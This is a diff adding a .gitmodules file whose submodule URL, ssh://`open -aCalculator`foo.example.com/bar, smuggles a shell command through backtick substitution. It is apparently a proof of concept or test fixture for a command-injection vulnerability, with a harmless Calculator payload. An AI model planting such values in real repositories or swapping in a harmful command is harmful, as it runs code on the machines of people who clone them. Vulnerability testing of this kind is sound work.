@@ -1,0 +1,3 @@
+[submodule "cves"]
+	path = cves
+	url = ssh://`open -aCalculator`foo.example.com/bar
